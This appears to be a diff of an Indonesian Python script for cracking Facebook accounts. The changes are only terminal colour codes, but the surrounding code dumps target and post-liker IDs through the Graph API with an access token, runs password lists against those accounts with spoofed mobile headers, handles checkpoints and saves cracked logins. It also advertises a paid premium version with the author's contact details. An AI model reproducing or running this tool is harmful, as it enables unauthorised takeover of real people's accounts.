@@ -132,7 +132,7 @@ def banner():
 \033[1;34m      |___         ___|       [®]UPDATE V1.2
 \033[1;33m ________| S H I N |_________ [®]WESNGOPIORAHHHH
 
-\033[0;35m ••••••••••••••••••••••TURU BANG•••••••••••••••••••••••••
+\033[1;35m ••••••••••••••••••••••TURU BANG•••••••••••••••••••••••••
 ''')
 header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
 def mmmasuk():
@@ -231,12 +231,12 @@ def menu():
             dirs = os.listdir("hasil")
             print
             for file in dirs:
-                print(" \033[0;36m[\033[0;35m+\033[1;36m]\033[0;00m Berikut adalah FILE HASIL CRACK ")
-                jeeck(" \033[0;36m[\033[0;35m+\033[1;36m]\033[0;00m ___/--> \033[0;33m%s"%(file));jeda(0.2)
+                print(" \033[1;36m[\033[0;35m+\033[1;36m]\033[0;00m Berikut adalah FILE HASIL CRACK ")
+                jeeck(" \033[1;36m[\033[0;35m+\033[1;36m]\033[0;00m ___/--> \033[0;33m%s"%(file));jeda(0.2)
             print("\n %s[%s+%s] Contoh : CP-%s-%s-%s%s"%(B,B,B,P,op,ta,".txt"))
             file = raw_input("\n \033[0;36m[\033[1;35m+\033[1;36m]\033[0;00m Nama file : ");jeda(0.2)
             if file == "":
-                jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m File tidak di temukan :)")
+                jeeck(" \033[1;36m[\033[0;35m+\033[0;36m]\033[0;00m File tidak di temukan :)")
 #            total = open(" hasil/%s"%(file)).read().splitlines()
             total = open("hasil/%s"%(file)).read().splitlines()
             print(" %s[%s+%s] ________________________________________"%(P,B,P));jeda(2)
@@ -257,7 +257,7 @@ def menu():
         tik();jeda(1);os.system('rm -rf token.txt')
         jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Berhasil di logout");exit()
     else:
-        jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Isi dengan benar babi ");menu()
+        jeeck(" \033[0;36m[\033[1;35m+\033[1;36m]\033[0;00m Isi dengan benar babi ");menu()
 
 def masuk():
     os.system('clear');banner()
@@ -282,12 +282,12 @@ def masuk():
     #	jeeckxd 
 # AINK PRIVAT YA NGAB :V KETIKAN TEMEN AINK :(
 def gobloklu():
-   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Kamu bukan userpermium")
-   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m hubungi author jika ingin membeli FILE PREMIUM")
-   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m CONTACK :")
-   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m         ( Wa : 085740559154")
-   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m         ( Fb : www.facebook.com/100057370791997")
-   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m         ( Em : ekaarsana029@gmail.com")
+   jeeck("\033[0;36m[\033[1;35m+\033[1;36m]\033[0;00m Kamu bukan userpermium")
+   jeeck("\033[0;36m[\033[1;35m+\033[1;36m]\033[0;00m hubungi author jika ingin membeli FILE PREMIUM")
+   jeeck("\033[0;36m[\033[1;35m+\033[1;36m]\033[0;00m CONTACK :")
+   jeeck("\033[0;36m[\033[1;35m+\033[1;36m]\033[0;00m         ( Wa : 085740559154")
+   jeeck("\033[0;36m[\033[1;35m+\033[1;36m]\033[0;00m         ( Fb : www.facebook.com/100057370791997")
+   jeeck("\033[0;36m[\033[1;35m+\033[1;36m]\033[0;00m         ( Em : ekaarsana029@gmail.com")
    raw_input('\n%s[%s+%s] \033[0;33m[%s Enter \033[0;33m] '%(B,J,B,U,))
    masuk()
 # BIASA :V
@@ -334,15 +334,15 @@ from concurrent.futures import ThreadPoolExecutor
 from bs4 import BeautifulSoup as parser
 
 def cek_opsi():
-    print(" \033[0;33mMasukan file Contoh : \033[0;00mhasil/CP-22-Januari-2222.txt")
+    print(" \033[1;33mMasukan file Contoh : \033[0;00mhasil/CP-22-Januari-2222.txt")
     file = raw_input(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Nama file : ")
     if file == '':
-        jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Wronk input :)");exit()
+        jeeck(" \033[1;36m[\033[0;35m+\033[0;36m]\033[0;00m Wronk input :)");exit()
     
     try:
         self = open(file, 'r').readlines()
     except IOError:
-        jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m File tidak ada :( ");exit()
+        jeeck("\033[1;36m[\033[1;35m+\033[0;36m]\033[0;00m File tidak ada :( ");exit()
 
     jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Total akun : %s"%(len(self)))
     for yes in self:
@@ -416,7 +416,7 @@ def check_in(user, pasw):
         num = 0
         for _ in xe:
             num += 1
-            print '  \033[0;36m[\033[0;35m' + str(num) + '\033[0;36m]\033[0;33m ' + _[0][0] + '\033[0;36m,\033[0;00m ' + _[0][1]
+            print '  \033[1;36m[\033[1;35m' + str(num) + '\033[1;36m]\033[1;33m ' + _[0][0] + '\033[1;36m,\033[0;00m ' + _[0][1]
         
     elif 'checkpoint' in ses.cookies:
         form = run.find('form')
@@ -477,8 +477,8 @@ def publik(_jeeck_ganteng_kagakadapacar_,headers=header):
         os.mkdir('dump')
     except:pass
     try:
-    	jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Ketik 'me' untuk dump id sendiri")
-        idt = raw_input(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Id Target : %s"%(K))
+    	jeeck(" \033[1;36m[\033[1;35m+\033[1;36m]\033[0;00m Ketik 'me' untuk dump id sendiri")
+        idt = raw_input(" \033[1;36m[\033[1;35m+\033[1;36m]\033[0;00m Id Target : %s"%(K))
         gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,_jeeck_ganteng_kagakadapacar_))
         nm = json.loads(gas.text)
         file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
@@ -534,8 +534,8 @@ def postingan(_jeeck_ganteng_kagakadapacar_,headers=header):
     except:pass
     try:
 #    	
-        idt = raw_input(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Id postingan : ")
-        simpan = raw_input(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Nama file : ")
+        idt = raw_input(" \033[1;36m[\033[1;35m+\033[1;36m]\033[0;00m Id postingan : ")
+        simpan = raw_input(" \033[1;36m[\033[1;35m+\033[1;36m]\033[0;00m Nama file : ")
         r = requests.get('https://graph.facebook.com/%s/likes?limit=999999&access_token=%s'%(idt,_jeeck_ganteng_kagakadapacar_))
         id = []
         z = json.loads(r.text)
@@ -547,7 +547,7 @@ def postingan(_jeeck_ganteng_kagakadapacar_,headers=header):
             jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Mengumpulkan id : %s"%(str(len(id)))),
             sys.stdout.flush();jeda(0.0050)
         _jeeck_X_nano_sadcook_.close()
-        jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m File tersimpan di : %s"%(file))
+        jeeck(" \033[1;36m[\033[1;35m+\033[1;36m]\033[0;00m File tersimpan di : %s"%(file))
         raw_input('\n%s [ %senter %s] '%(P,B,P))
         menu()
     except Exception as e:
@@ -566,11 +566,11 @@ class ngentod:
         except:
             jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Apakah kamu sudah dump id ...?")
             raw_input('\n%s [ %senter %s] '%(B,O,B));menu()
-        __jeeck__ganz__X__sad__boy__ = raw_input(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Ingin menggunakan password manual/otomatis (Y/o) : ")
+        __jeeck__ganz__X__sad__boy__ = raw_input(" \033[1;36m[\033[1;35m+\033[1;36m]\033[0;00m Ingin menggunakan password manual/otomatis (Y/o) : ")
         if __jeeck__ganz__X__sad__boy__ in ('Y', 'y'):
-            jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Gunakan tanda (,) untuk pemisah conton : ( akusayangkamu,anjing)")
+            jeeck(" \033[0;36m[\033[1;35m+\033[1;36m]\033[0;00m Gunakan tanda (,) untuk pemisah conton : ( akusayangkamu,anjing)")
             while True:
-                pwx = raw_input(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Set pass : ")
+                pwx = raw_input(" \033[1;36m[\033[1;35m+\033[1;36m]\033[0;00m Set pass : ")
                 if pwx == '':
                     jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Jan kosong bree ");exit()
                 elif len(pwx)<=5:
@@ -631,7 +631,7 @@ class ngentod:
                     print(" \033[1;36m[\033[1;35m1\033[1;36m]\033[0;00m B-Api [ FAST CRACK ]")
                     print(" \033[1;36m[\033[1;35m2\033[1;36m]\033[0;00m Mbasic [ Selow V1 ]")
                     print(" \033[1;36m[\033[1;35m3\033[1;36m]\033[0;00m Free Fb [ Selow V2 ]")
-                    jeeck(" \033[1;36m[\033[1;35m4\033[1;36m]\033[0;00m Mobile [ Supper Sellow RECOMENDED V3 ]")
+                    jeeck(" \033[1;36m[\033[1;35m4\033[1;36m]\033[1;32m Mobile [ Supper Sellow RECOMENDED V3 ]")
                     _jeeck_X_nano_(pwx.split(','))
                     break
         elif __jeeck__ganz__X__sad__boy__ in ('O', 'o'):
@@ -639,7 +639,7 @@ class ngentod:
             print(" \033[1;36m[\033[1;35m1\033[1;36m]\033[0;00m B-Api [ FAST CRACK ]")
             print(" \033[1;36m[\033[1;35m2\033[1;36m]\033[0;00m Mbasic [ Selow V1 ]")
             print(" \033[1;36m[\033[1;35m3\033[1;36m]\033[0;00m Free fb[ Selow V2 ]")
-            jeeck(" \033[1;36m[\033[1;35m4\033[1;36m]\033[0;00m Mobile [ Supper Sellow RECOMENDED V3 ]")
+            jeeck(" \033[1;36m[\033[1;35m4\033[1;36m]\033[1;32m Mobile [ Supper Sellow RECOMENDED V3 ]")
             self.langsung()
         else:
             jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Isi dengan benar");jeda(2);menu()
